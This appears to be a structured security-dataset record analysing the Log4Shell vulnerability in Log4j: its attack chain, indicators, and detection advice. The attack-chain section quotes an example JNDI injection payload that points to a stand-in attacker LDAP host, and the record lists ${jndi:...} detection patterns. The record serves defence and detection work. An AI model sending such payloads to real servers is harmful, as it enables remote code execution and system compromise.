package_info.why_malicious: The Log4j package contains a critical remote code execution vulnerability (CVE-2021-44228, also known as Log4Shell) that allows attackers to inject specially crafted log messages containing JNDI lookup patterns. When processed by vulnerable Log4j versions, these messages trigger remote lookups and can result in arbitrary code execution, enabling full system compromise.

execution_context.trigger: runtime (when a log message is processed)
required_permissions: filesystem (if remote code writes to disk)

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, Log4j interprets the pattern, initiates a remote JNDI lookup to the attacker-controlled LDAP server, retrieves and loads remote code, resulting in arbitrary code execution on the vulnerable server.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger remote JNDI lookups, which can result in the execution of attacker-supplied code. Such dynamic code execution based on log content is highly abnormal and dangerous.
malice_analysis.violated_expectations: Standard logging libraries are expected to record messages without executing code or making network requests based on log content. Here, user-controlled input in logs leads directly to network activity and code execution.
malice_analysis.similar_legitimate_use: JNDI lookups may be used for legitimate resource resolution in trusted, internal environments where log content is strictly controlled, but never with untrusted or user-supplied input.
key_indicators: Log4j performing outbound LDAP/RMI/DNS lookups during log processing
Unexpected code execution or class loading triggered by log input
Presence of JndiLookup usage in stack traces or logs

attack_chain.action: Attacker sends a specially crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable server.
attack_chain.leads_to: Log4j processes the log message and interprets the JNDI pattern, initiating a remote lookup.

attack_chain.action: Log4j performs a remote JNDI lookup to the attacker-controlled LDAP server specified in the log message.
attack_chain.leads_to: Remote code or serialized object is retrieved and loaded by the server, resulting in arbitrary code execution and potential full system compromise.

behavioral_signatures: Log4j processing log messages containing ${jndi:...} patterns
Unexpected outbound LDAP, RMI, or DNS network requests originating from application servers during log processing
Runtime code execution or class loading triggered by log input
Presence of JndiLookup in stack traces or error logs
file_indicators: Presence of log4j-core-2.x.jar in application dependencies
Application configuration files enabling JndiLookup functionality
network_indicators: Outbound LDAP/RMI/DNS requests to external or untrusted domains (e.g., attacker.com)
Connections from application servers to unfamiliar IP addresses or domains immediately after log events
detection_knowledge.how_to_detect: Monitor application logs for ${jndi:...} patterns, especially those originating from user input. Inspect network traffic for unexpected outbound LDAP, RMI, or DNS requests from application servers. Audit application dependencies for vulnerable Log4j versions (2.0-beta9 to 2.14.1) and the presence of log4j-core-2.x.jar. Use intrusion detection/prevention systems (IDS/IPS) to identify and block exploit attempts involving JNDI lookups. Review stack traces and error logs for evidence of JndiLookup usage or related exceptions.
